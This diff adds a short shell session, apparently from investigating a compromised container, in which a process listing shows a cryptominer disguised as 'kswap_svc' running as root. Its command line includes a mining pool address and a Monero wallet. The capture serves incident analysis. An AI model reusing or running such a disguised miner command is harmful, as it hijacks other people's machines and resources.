@@ -1,0 +1,8 @@
+bash-5.0# ps ax
+PID   USER     TIME  COMMAND
+    1 root      2h06 kswap_svc -k -p docker -o 104.140.201.42:80 -u 44zJ1Spab8ZNWaQXaxWH5Vawkxfj5LLUUJ9vfS6nGoJXEQkwv8gQ6gGar55xeNwZVcSrSgAUqBKWgew5VuGRjb7N6MaV8Hv --donate-level=0 --coin=xmr
+   21 root      0:00 /bin/sh
+   33 root      0:00 bash
+   34 root      0:00 ps ax
+bash-5.0# find / -name kswap_svc
+/usr/local/bin/kswap_svc
